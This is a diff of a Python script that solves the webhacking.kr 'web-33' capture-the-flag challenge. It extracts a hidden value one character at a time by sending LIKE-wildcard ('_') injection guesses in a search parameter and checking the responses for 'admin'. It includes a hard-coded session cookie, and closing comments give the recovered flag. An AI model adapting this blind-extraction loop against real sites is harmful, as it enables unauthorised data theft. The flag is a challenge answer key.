@@ -2,13 +2,9 @@ import requests
 import string
 
 url = "https://webhacking.kr/challenge/web-33/index.php"
-cookie = {'PHPSESSID': 'csltdbnt02klcvgctq640tijhv'}
-
-param = {"search":"_"}
-req = requests.post(url, params=param, cookies=cookie)
+cookie = {'PHPSESSID': 'm583421oktu11value5t1h0crak3fe'}
 
 str1=string.printable
-str1=str1[:-38]
 
 def search_len(): # 44글자 (노가다로 구함)
     length = "_"
@@ -23,18 +19,31 @@ def search_len(): # 44글자 (노가다로 구함)
             break
 
 def search_str():
-    length = 44
     string = ""
-    value = ""
-    for i in range(44):
-        value2 = "_" * (44 - i)
+    for i in range(1,45):
         for value in str1:
-            param = {"search":"{}".format(str(value) + value2)}
+            if value == '%':
+                continue
+            if value == '\\':
+                continue
+            # if value == '_':
+            #     continue
+            data = string
+            data += value
+            data += "_" * (44 - i)
+            param = {"search":data}
             print(param)
-            req = requests.post(url, params=param, cookies=cookie)
-            if "admin" not in req.text:
-                string += str(value)
+            req = requests.post(url, data=param, cookies=cookie)
+            if (req.text.find("admin")!=-1):
+                string += value
+                break
         print(string)
     print("String:", string)
 
 search_str()
+
+# first export : "flag{himiko"
+
+# second export : "flag_himiko_toga_is_cute_dont_you_think_so?_"
+
+# flag : "flag{himiko_toga_is_cute_dont_you_think_so?}"
